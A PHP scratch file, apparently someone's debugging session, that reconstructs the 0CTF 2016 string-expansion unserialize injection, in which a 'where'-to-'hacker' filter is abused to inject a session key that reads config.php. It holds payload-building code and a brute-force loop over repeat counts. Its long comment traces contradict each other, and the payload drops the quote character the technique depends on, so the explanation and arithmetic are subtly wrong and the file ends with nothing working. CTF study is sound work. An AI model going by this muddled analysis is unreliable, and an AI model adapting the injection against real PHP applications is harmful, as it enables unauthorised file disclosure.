<?php
// I see! The 0CTF 2016 exploit also fails with my simulation.
// 
// Let me re-read the writeup more carefully.
// 
// The key insight from the writeup:
// "Repeat "where" enough times so the expansion (5->6 per word) overflows
// by exactly strlen($payload) bytes"
// 
// So the trick is to calculate the overflow PRECISELY!
// 
// Each "where" (5 bytes) becomes "hacker" (6 bytes), adding 1 byte.
// If we have N "where"s, we add N bytes.
// 
// We want the overflow to be exactly strlen($payload) bytes.
// 
// Let me calculate:
// payload = ";}s:5:"photo";s:10:"config.php";} (33 bytes)
// We need 33 bytes of overflow.
// 
// Each "where" adds 1 byte of overflow.
// So we need 33 "where"s.
// 
// nickname = "where" * 33 + payload = 165 + 33 = 198 bytes
// 
// After filter: "hacker" * 33 + payload = 198 + 33 = 231 bytes
// 
// But the serialized length says 198 bytes!
// 
// PHP reads 198 bytes from the 231-byte string.
// PHP reads: "hacker" * 33 + payload - 33 = 198 bytes
// 
// Wait, let me calculate:
// "hacker" * 33 = 198 bytes
// 
// So PHP reads exactly 33 "hacker"s (198 bytes)!
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: ; (from the payload)
// Expected ", got ;
// Error!

// Hmm, this still doesn't work. Let me think about this differently.

// Actually, I think the key is that the payload starts with ";}!
// 
// Let me trace through:
// 
// After filter: s:198:"hackerhacker...hacker";}s:5:"photo";s:10:"config.php";}";}
// 
// PHP reads 198 bytes from position after opening quote.
// Position after opening quote: h (first char of "hacker")
// 
// PHP reads: hackerhacker...hacker";}s:5:"photo";s:10:"config (198 bytes)
// 
// Wait, let me count:
// "hacker" * 33 = 198 bytes
// 
// So PHP reads 33 "hacker"s, which is exactly 198 bytes.
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: ; (from the payload, which starts with ";}...)
// 
// Hmm, but the payload starts with ";}, not just ;.
// 
// Let me trace through more carefully:
// 
// After filter: s:198:"hackerhacker...hacker";}s:5:"photo";s:10:"config.php";}";}
// 
// The content after the opening quote is:
// hackerhacker...hacker";}s:5:"photo";s:10:"config.php";}";}
// 
// Let me count:
// "hacker" * 33 = 198 bytes
// Then: ";}s:5:"photo";s:10:"config.php";}";} (extra content)
// 
// PHP reads 198 bytes: "hacker" * 33 (exactly 198 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: ; (from ";}...)
// Expected ", got ;
// Error!

// So the issue is that the payload starts with ";}, not with "!

// Let me adjust the payload:
// payload = "}s:5:"photo";s:10:"config.php";}
// 
// This starts with "}, which includes a closing quote!

// Let me test:
$payload = '}s:5:"photo";s:10:"config.php";}';
$nickname = str_repeat("where", strlen($payload)) . $payload;

echo "Payload: $payload\n";
echo "Payload length: " . strlen($payload) . "\n";
echo "Nickname length: " . strlen($nickname) . "\n\n";

function filter_0ctf($img){
    return preg_replace('/where/', 'hacker', $img);
}

$_SESSION = [];
$_SESSION['nickname'] = $nickname;

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter_0ctf($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);
echo "\n";

// Hmm, let me also check if the payload should include the closing quote of the current value.

// Actually, I think the key is:
// The payload should include ";} which closes the current value AND the array!
// 
// But the serialized format is: s:N:"CONTENT";
// 
// If we inject ";} as part of the CONTENT, PHP would read it as part of the string,
// not as a closing quote and brace!

// Let me think about this differently.
// 
// The key insight: PHP reads N bytes as CONTENT.
// After reading N bytes, PHP expects "; (closing quote and semicolon).
// 
// If the Nth byte is followed by ";, PHP will continue parsing!
// 
// But if the Nth byte is followed by something else, PHP will error!

// So the trick is to make the Nth byte be followed by ";!
// 
// For EXPANSION:
// After filter, the string is LONGER than N.
// PHP reads N bytes and STOPS.
// The next chars are the EXTRA bytes from the expansion!
// 
// If the EXTRA bytes start with ";, PHP will continue parsing!
// 
// For example:
// Original: s:5:"where"
// After filter: s:5:"hacker"
// 
// PHP reads 5 bytes: "hacke"
// The next char is: r (from "hacker")
// Expected ", got r
// Error!

// But if we have:
// Original: s:5:"where" + extra
// After filter: s:5:"hacker" + extra
// 
// PHP reads 5 bytes: "hacke"
// The next char is: r (from "hacker")
// Expected ", got r
// Error!

// This still doesn't work!

// Let me try a different calculation:
// 
// If we have N "where"s, each becoming "hacker", we add N bytes.
// 
// Original nickname: "where" * N + payload
// Original length: 5*N + len(payload)
// 
// After filter: "hacker" * N + payload
// Filtered length: 6*N + len(payload)
// 
// Serialized length: 5*N + len(payload)
// 
// PHP reads 5*N + len(payload) bytes from the filtered string.
// 
// The filtered string has: "hacker" * N + payload (6*N + len(payload) bytes)
// 
// PHP reads: 5*N + len(payload) bytes
// 
// If 5*N + len(payload) < 6*N, PHP reads only "hacker"s.
// If 5*N + len(payload) >= 6*N, PHP reads some "hacker"s and some payload.
// 
// Let me calculate:
// 5*N + len(payload) = 6*N - N + len(payload)
// 
// If len(payload) < N, then 5*N + len(payload) < 6*N.
// If len(payload) >= N, then 5*N + len(payload) >= 6*N.
// 
// For the writeup:
// len(payload) = 33
// N = 33
// 
// 5*33 + 33 = 198
// 6*33 = 198
// 
// So 5*N + len(payload) = 6*N!
// 
// PHP reads exactly 6*N bytes = 198 bytes = 33 "hacker"s.
// 
// Then PHP expects "; (closing quote and semicolon)
// The next char is: ; (from the payload)
// Expected ", got ;
// Error!

// Hmm, this still doesn't work. Let me adjust N.

// If N = 32:
// 5*32 + 33 = 193
// 6*32 = 192
// 
// So 5*N + len(payload) > 6*N!
// 
// PHP reads 193 bytes from the filtered string.
// The filtered string has: "hacker" * 32 + payload = 192 + 33 = 225 bytes.
// 
// PHP reads: 192 bytes of "hacker"s + 1 byte from payload = 193 bytes.
// 
// The 193rd byte is: ; (first char of payload ";}...)
// 
// Then PHP expects "; (closing quote and semicolon)
// The next char is: } (second char of payload)
// Expected ", got }
// Error!

// Let me try N = 34:
// 5*34 + 33 = 203
// 6*34 = 204
// 
// So 5*N + len(payload) < 6*N!
// 
// PHP reads 203 bytes from the filtered string.
// The filtered string has: "hacker" * 34 + payload = 204 + 33 = 237 bytes.
// 
// PHP reads: 203 bytes from 204 "hacker" bytes.
// 
// The 203rd byte is: k (from the 34th "hacker")
// 
// Then PHP expects "; (closing quote and semicolon)
// The next char is: e (from the 34th "hacker")
// Expected ", got e
// Error!

// Hmm, none of these work!

// Let me think about this differently.
// 
// The key insight: we want the Nth byte to be followed by ";!
// 
// For EXPANSION:
// After filter, the string is LONGER than N.
// We want the EXTRA bytes to start with ";!
// 
// If we have:
// nickname = "where" * N + ";}" + rest
// 
// After filter: "hacker" * N + ";}" + rest
// 
// PHP reads 5*N + len(";}" + rest) bytes.
// 
// If 5*N + len(";}" + rest) = 6*N, then PHP reads exactly N "hacker"s.
// Then the next char is: ; (from ";}")
// Expected ", got ;
// Error!

// If 5*N + len(";}" + rest) = 6*N - 1, then PHP reads N-1 "hacker"s + 5 bytes.
// 
// Hmm, this is getting complicated. Let me just try different values.

for ($n = 30; $n <= 40; $n++) {
    $payload = ';}s:5:"photo";s:10:"config.php";}';
    $nickname = str_repeat("where", $n) . $payload;
    
    $_SESSION = [];
    $_SESSION['nickname'] = $nickname;
    
    $serialized = serialize($_SESSION);
    $filtered = preg_replace('/where/', 'hacker', $serialized);
    
    echo "=== N=$n ===\n";
    echo "Serialized length: " . (5*$n + strlen($payload)) . "\n";
    echo "Filtered 'hacker' length: " . (6*$n) . "\n";
    echo "Filtered total length: " . (6*$n + strlen($payload)) . "\n";
    
    $result = @unserialize($filtered);
    if ($result !== false) {
        echo "SUCCESS!\n";
        var_dump($result);
        break;
    } else {
        echo "Failed\n";
    }
    echo "\n";
}

